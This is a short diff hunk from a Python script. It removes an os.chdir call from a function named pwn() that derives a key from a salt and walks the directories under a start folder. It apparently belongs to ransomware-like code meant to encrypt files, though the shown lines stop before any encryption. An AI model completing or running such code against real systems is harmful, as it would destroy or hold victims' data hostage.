@@ -62,7 +62,6 @@ def gen_key(salt):
 
 
 def pwn():
-    os.chdir(START_DIR)
     key = gen_key(SALT)
     dirs = next(os.walk(START_DIR))[1]
     for dir in dirs:
